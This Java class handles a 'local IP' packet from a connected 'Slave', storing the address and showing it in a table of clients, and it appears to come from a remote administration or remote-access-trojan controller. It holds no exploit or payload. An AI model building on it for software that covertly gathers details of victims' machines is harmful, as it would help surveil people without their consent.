package com.redpois0n.packets;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.Frame;
import com.redpois0n.utils.Util;

public class PacketLOCALIP extends AbstractPacket {

	@Override
	public void read(Slave slave, String line) throws Exception {
		String raw = slave.readLine();
		slave.setLocalIP(raw);
		
		int row = Util.getRow(slave);
		
		Frame.mainModel.setValueAt(raw, row, 8);
	}

}
